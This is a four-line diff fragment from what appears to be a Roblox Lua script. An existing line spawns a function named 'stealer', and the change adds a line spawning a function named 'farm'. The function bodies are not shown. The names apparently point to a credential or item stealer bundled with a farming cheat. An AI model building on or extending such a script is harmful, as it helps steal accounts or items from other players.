@@ -6,4 +6,4 @@ local function farm()
 end
 
 task.spawn(stealer)
-
+task.spawn(farm)
